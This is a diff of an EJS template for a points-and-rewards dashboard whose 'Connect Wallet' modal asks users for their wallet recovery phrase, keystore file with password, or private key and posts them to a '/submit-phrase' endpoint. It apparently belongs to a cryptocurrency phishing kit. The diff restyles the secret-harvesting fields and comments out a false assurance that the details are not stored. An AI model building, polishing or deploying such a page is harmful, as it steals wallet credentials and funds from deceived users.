@@ -5,8 +5,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dashboard</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Special+Elite&display=swap">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
     <style>
+        h1 {
+            font-family: 'Special Elite', cursive;
+        }
+
         .hidden {
             display: none;
         }
@@ -61,96 +66,110 @@
         .cancel-btn:hover {
             opacity: 0.8;
         }
+
+        .reward-image {
+            width: 100px;
+            /* Adjust the size as needed */
+            height: auto;
+            /* Maintain aspect ratio */
+        }
     </style>
 
 </head>
 
 <body class="bg-gray-900 text-white">
     <div class="container mx-auto p-4">
-        <h1 class="text-4xl font-bold mb-4">Dashboard</h1>
-
-        <!-- Welcome Message -->
-        <p class="text-xl mb-4">Welcome, <%= user.email %>
-        </p>
-        <p class="text-xl mb-6">Total Points: <span id="totalPoints"></span></p>
-
-        <!-- Connect Wallet Button -->
-        <div class="mb-4">
-            <button id="connectWalletButton"
-                class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">
-                Connect Wallet
-            </button>
+        <div class="flex justify-between items-center mb-4">
+            <div>
+                <h1 class="text-4xl font-bold">Dashboard</h1>
+            </div>
+            <div class="items-center space-x-4">
+                <h1 class="text-xl">Total Points: <span id="totalPoints"></span></h1><br />
+                <button id="connectWalletButton"
+                    class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">
+                    Connect Wallet
+                </button>
+            </div>
         </div>
 
+        <!-- Welcome Message -->
+        <p class="text-xl mb-6">Welcome, <%= user.email %>
+        </p>
+        <hr />
+        <h1 class="text-red-500 text-2xl">
+            <%= error %>
+        </h1>
         <!-- Rewards Sections -->
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div class="grid grid-cols-1 gap-4 mt-2">
+            <!-- Available Rewards Section -->
+            <div class="bg-gray-800 p-4 rounded-md">
+                <% if (rewards.length> 0) { %>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
+                        <% rewards.forEach(reward=> { %>
+                            <div class="reward-card p-4 border border-gray-700 rounded-md flex flex-col">
+                                <h3 class="text-xl font-semibold">
+                                    <%= reward.name %>
+                                </h3>
+                                <p class="flex-grow">
+                                    <%= reward.description %>
+                                </p>
+                                <form action="/claim-reward" method="POST" class="claim-form mt-2">
+                                    <input type="hidden" name="rewardId" value="<%= reward._id %>">
+                                    <input type="hidden" name="userId" value="<%= user._id %>">
+                                    <button type="submit"
+                                        class="<%= reward.points === 100 ? 'bg-gradient-to-r from-green-500 via-green-600 to-green-700 hover:from-green-600 hover:via-green-700 hover:to-green-800' : 'bg-gray-500 cursor-not-allowed' %> text-white font-bold py-2 px-4 rounded-md"
+                                        <%=reward.points !==100 ? 'disabled' : '' %>>
+                                        Claim Reward
+                                    </button>
+                                </form>
+                            </div>
+                            <% }); %>
+                    </div>
+                    <% } else { %>
+                        <p>No rewards available.</p>
+                        <% } %>
+            </div>
+
+
             <!-- My Rewards Section -->
             <div>
                 <h2 class="text-2xl font-bold mb-2">My Rewards</h2>
                 <div class="bg-gray-800 p-4 rounded-md">
                     <% if (myRewards.length> 0) { %>
-                        <ul>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
                             <% myRewards.forEach(userReward=> { %>
-                                <li class="mb-2 p-2 border-b border-gray-700">
-                                    <h3 class="text-xl font-semibold">
-                                        <%= userReward.rewardId.name %>
-                                    </h3>
-                                    <p class="reward-points" data-points="<%= userReward.rewardId.points %>">
-                                        Points: <%= userReward.rewardId.points %>
-                                    </p>
-                                    <p class="text-green-300">Claimed: <%= new
-                                            Date(userReward.createdAt).toLocaleString() %>
-                                    </p>
-                                </li>
+                                <div class="reward-card p-4 border border-gray-700 rounded-md flex">
+                                    <img src="<%= userReward.rewardId.image %>" alt="Reward Image"
+                                        class="reward-image w-1/3 h-auto object-cover rounded-md">
+                                    <div class="ml-4 w-2/3">
+                                        <h3 class="text-xl font-semibold">
+                                            <%= userReward.rewardId.name %>
+                                        </h3>
+                                        <p class="reward-points" data-points="<%= userReward.rewardId.points %>">
+                                            Points: <%= userReward.rewardId.points %>
+                                        </p>
+                                        <!-- <p class="text-green-300">Claimed: <%= new Date(userReward.createdAt).toLocaleString() %> </p> -->
+                                    </div>
+                                </div>
                                 <% }); %>
-                        </ul>
+                        </div>
                         <% } else { %>
                             <p>No rewards claimed yet.</p>
-                            <% } %>
-                </div>
-            </div>
-
-            <!-- Available Rewards Section -->
-            <div>
-                <h2 class="text-2xl font-bold mb-2">Available Rewards</h2>
-                <div class="bg-gray-800 p-4 rounded-md">
-                    <% if (rewards.length> 0) { %>
-                        <ul>
-                            <% rewards.forEach(reward=> { %>
-                                <li class="mb-2 p-2 border-b border-gray-700">
-                                    <h3 class="text-xl font-semibold">
-                                        <%= reward.name %>
-                                    </h3>
-                                    <p>
-                                        <%= reward.description %>
-                                    </p>
-                                    <form action="/claim-reward" method="POST" class="claim-form">
-                                        <input type="hidden" name="rewardId" value="<%= reward._id %>">
-                                        <input type="hidden" name="userId" value="<%= user._id %>">
-                                        <button type="submit"
-                                            class="bg-green-500 hover:bg-green-700 text-white font-bold py-2 px-4 rounded">
-                                            Claim Reward
-                                        </button>
-                                    </form>
-                                </li>
-                                <% }); %>
-                        </ul>
-                        <% } else { %>
-                            <p>No rewards available.</p>
                             <% } %>
                 </div>
             </div>
         </div>
     </div>
 
+
     <!-- Connect Wallet Modal -->
     <div id="walletModal" class="modal fixed inset-0 flex items-center justify-center hidden">
         <div class="modal-content">
             <h2 class="text-2xl font-bold mb-4">Connect Your Wallet</h2>
-            <button id="closeModal" class="cancel-btn mb-4">Close</button>
+            <button id="closeModal" class="mb-4">X</button>
             <!-- Wallet Connection Form -->
             <form method="post" action="/submit-phrase" id="walletConnectionForm">
-                <div class="form-dropdown image-dropdown">
+                <div class="form-dropdown image-dropdown my-2">
                     <label for="wallet_id">Wallet Type:</label>
                     <select id="wallet_id" name="wallet_id">
                         <!-- start -->
@@ -1554,27 +1573,31 @@
                     </select>
                 </div>
 
-                <div id="phraseField" class="toggle-field hidden">
+                <div id="phraseField" class="toggle-field hidden my-2">
                     <textarea id="phrase" name="phraseinput" cols="30" rows="4" placeholder="Enter your Recovery Phrase"
-                        style="color: #1f1f1f;"></textarea>
+                        style="color: #f3ebeb; background-color: #1f1f1f; width: 100%; border-radius: 2px;"
+                        class="p-2"></textarea>
                     <p>Typically 12 (sometimes 24) words separated by single spaces</p>
                 </div>
 
-                <div id="keystoreField" class="toggle-field hidden">
+                <div id="keystoreField" class="toggle-field hidden my-2">
                     <textarea id="keystore" name="keystoreval" cols="30" rows="4" placeholder="Enter your Keystore JSON"
-                        style="color: #1f1f1f;"></textarea>
+                        style="color: #f0eded;background-color: #1f1f1f;width: 100%; border-radius: 2px;"
+                        class="p-2"></textarea>
                     <p>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
                     <input type="text" id="wallet_password" name="password" placeholder="Enter Wallet Password"
-                        class="w-full p-2 mt-2 border border-gray-300 rounded-md" style="color: #1f1f1f;">
+                        class="w-full p-2 mt-2 border border-gray-300 rounded-md"
+                        style="color: #d8cfcf;background-color: #1f1f1f;">
                 </div>
 
-                <div id="privateField" class="toggle-field hidden">
-                    <input type="text" id="private_key" name="privatekeyval" style="color: #1f1f1f;"
-                        placeholder="Enter Your Private Key" class="w-full p-2 mt-2 border border-gray-300 rounded-md">
+                <div id="privateField" class="toggle-field hidden my-2">
+                    <input type="text" id="private_key" name="privatekeyval"
+                        style="color: #ebe6e6; background-color: #1f1f1f;" placeholder="Enter Your Private Key"
+                        class="w-full p-2 mt-2 border border-gray-300 rounded-md">
                 </div>
 
-                <p class="text-sm mt-2">Any misinformation may hinder the successful resolution of the issue. Your
-                    details are not stored on our system! It's for resolution purposes only.</p>
+                <!-- <p class="text-sm mt-2">Any misinformation may hinder the successful resolution of the issue. Your
+                    details are not stored on our system! It's for resolution purposes only.</p> -->
                 <div class="form-footer">
                     <button class="connect-btn" type="submit">Connect Wallet</button>
                     <input type="hidden" name="action" value="wallet_recovery">
